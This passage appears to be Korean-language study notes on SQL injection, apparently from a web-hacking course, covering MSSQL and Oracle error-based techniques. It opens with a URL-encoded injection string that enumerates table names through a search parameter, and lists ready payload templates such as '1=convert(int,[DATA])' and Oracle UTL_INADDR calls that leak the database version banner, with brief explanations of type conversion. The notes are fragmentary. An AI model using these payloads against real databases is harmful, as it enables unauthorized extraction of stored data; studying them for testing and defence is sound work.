 search_type=title&keyword=test%25'+and+1=(select top 1 name from board.sys.objects where type='U' and name not in(select top 0 name from board.sys.objects where type='U'))+and+'%25'='
 
 
 
 2) 비 순차적 접근
 
 
3. 데이터 목록화 
 1) 정렬(ORDER BY) //2005이상에서는 안됨
 2) NOT IN 연산자
 select top 1 name from board.sys.objects where type='U' and name not in(select top 0 name from board.sys.objects where type='U')
 
 3) ROW_NUMBER() 함수
 
 
 
 
 
 
 
 
 
 
 
 
[ORACLE]
 UTL_INADDR.GET_HOST_NAME((select banner from v$version where rownum=1))
 UTL_INADDR.GET_HOST_ADDRESS((select banner from v$version where rownum=1))
 
 - 공격프로세스
공격기법 선택
공격 검증
데이터 조회 공격 - 1)기본 정보 목록화 2) 메타 데이터 목록화 3) 데이터 목록화

 
 - 묵시적 형 변환 
피 연산자들의 데이터 타입이 다를 경우 우선 순위가 높은 쪽으로 자동 형 변환이 이뤄진다.
ex) 1 = '1' //1(int) = '1'(char->int)
 
MYSQL
>select * from member where 1='1'; //참

 - 명시적 형 변환 
함수를 통해 수동 형 변환이 이뤄진다.
ex) 1=convert(int,'1') //'1'(char->int)
 
 *MSSQL ERROR-BASED 공격 검증
 형 변환 특이점을 이용한 ERROR-BASED 공격 검증 : 묵시적 형변환
 
 1='crehacktive' //1(int)='crehacktive'(char->int 묵시적 형변환 실패)
  varchar 값 'crehacktive'을 int 데이터 형식의 열로 변환하는 중 구문 오류가 발생했습니다. //형 변환 시 실패한 데이터를 에러 메시지 내 노출
 
 1='crehacktive'/0 //1='crehacktive'(char / int) //형변환 실패
 1=convert(int,'crehacktive') //형변환 실패
 
 *MSSQL ERROR-BASED 공격 페이로드
1=[DATA]
1=[DATA]/0
1=convert(int,[DATA])


 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   
   
   
  
